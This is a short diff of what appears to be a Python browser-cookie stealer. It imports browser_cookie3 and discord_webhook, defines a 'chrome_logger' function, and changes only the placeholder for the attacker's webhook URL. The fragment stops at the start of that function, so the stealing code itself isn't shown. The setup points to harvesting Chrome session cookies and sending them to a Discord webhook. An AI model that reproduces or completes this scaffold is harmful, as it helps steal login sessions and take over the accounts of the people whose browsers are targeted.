@@ -1,6 +1,6 @@
 import browser_cookie3, requests, threading, discord_webhook
 
-webhook = 'YOUR TOKEN HERE'
+webhook = 'YOUR WEBHOOK HERE'
 
 def chrome_logger():
     try:
